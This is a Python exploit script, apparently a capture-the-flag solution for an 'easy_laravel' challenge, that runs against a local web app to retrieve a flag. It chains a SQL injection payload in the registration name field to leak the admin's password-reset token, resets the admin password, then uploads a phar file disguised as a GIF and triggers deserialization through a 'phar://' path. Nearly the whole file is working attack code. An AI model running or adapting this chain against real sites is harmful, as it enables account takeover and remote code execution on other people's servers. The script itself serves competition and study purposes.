#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2018-10-15 21:39:25
"""
import requests
import random
import time
import string
import re

req = requests.Session()

URL = 'http://127.0.0.1:8081'


def randstr(n=10):
    return ''.join([str(random.choice(string.ascii_lowercase)) for i in range(n)])


def get_csrf_token(url):
    res = req.get(URL+url)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'<meta name="csrf-token" content="(.*?)">', html)
        if m and len(m) > 0:
            csrftoken = m[0]
            return csrftoken
    print("[-] Request CSRT Error")
    return False


def req_reset(email='admin@qvq.im'):
    csrftoken = get_csrf_token('/password/reset')
    if not csrftoken:
        return False
    data = {
        "_token": csrftoken,
        "email": email
    }
    res = None
    try:
        res = req.post(URL+'/password/email', data=data, timeout=1)
        if res.status_code == 200 or res.status_code == 500:
            print("[+] Request Reset Admin ")
            return True
    except:
        # server not set email server, then return 500
        print("[+] !Request Reset Admin ")
        return True
    else:
        print("[-] Request Reset Error")


def reg_notes_token():
    name = "virink' union select 1,token,3,4,5 from password_resets order by created_at desc limit 1-- -"
    email = "e%s@vvv.vvv" % randstr()
    csrftoken = get_csrf_token('/register')
    if not csrftoken:
        return False
    data = {
        "_token": csrftoken,
        "name": name,
        "email": email,
        "password": "password",
        "password_confirmation": "password"
    }
    # Register
    res = req.post(URL+'/register', data=data)
    if res.status_code == 200:
        print("[+] Register [%s] success" % email)
        # Note
        res = req.get(URL+'/note')
        if res.status_code == 200:
            html = res.content.decode('utf-8')
            m = re.findall(r'([a-f0-9]{64})', html)
            if m and len(m) > 0:
                print("[+] Reset Token : %s" % m[0])
                return m[0]
            else:
                print("[-] Reset Token Error")
        else:
            print("[-] Get Note error")
    else:
        print("[-] Register error")
    return False


def reset_passwd(token, passwd='123456', email='admin@qvq.im'):
    csrftoken = get_csrf_token('/password/reset/%s' % token)
    if csrftoken:
        data = {
            "_token": csrftoken,
            "token": token,
            "email": email,
            "password": "password",
            "password_confirmation": "password"
        }
        res = req.post(URL+'/password/reset', data=data)
        if res.status_code == 200:
            print("[+] Reset Passwd success")
            return True
        else:
            print("[-] Reset Passwd Error")


def upload(uploadfile='easy_laravel_exp.phar'):
    csrftoken = get_csrf_token('/upload')
    filename = randstr()+'.gif'
    if csrftoken:
        data = {
            "_token": csrftoken
        }
        files = {
            "file": (filename, open(uploadfile, 'rb').read(), 'application/octet-stream'),
        }
        res = req.post(URL+'/upload', data=data, files=files)
        if res.status_code == 200:
            print("[+] Upload exp gif success")
            return filename
    return False


def checkfile(filename='easy_laravel_exp.gif'):
    csrftoken = get_csrf_token('/files')
    if csrftoken:
        data = {
            "_token": csrftoken,
            "filename": "/%s/v.txt" % filename,
        }
        res = req.post(
            URL+'/check?path=phar://../storage/app/public', data=data)
        if res.status_code == 200:
            print("[+] Check File success")
            return True
    print("[-] Check File Error")


def getflag():
    res = req.get(URL+'/flag')
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        flag = html[html.find('<div class="panel-body">')+34:-225]
        return flag.strip()


if __name__ == '__main__':
    if req_reset():
        token = reg_notes_token()
        print("[+] %s/password/reset/%s" % (URL, token))
        req = requests.Session()
        if token:
            if reset_passwd(token):
                flag = getflag()
                print("[-] Get Flag Before: \033[91m%s\033[0m" % flag)
                fn = upload()
                if fn:
                    if checkfile(fn):
                        flag = getflag()
                        print("[!!!] Get Flag : \033[91m%s\033[0m" % flag)
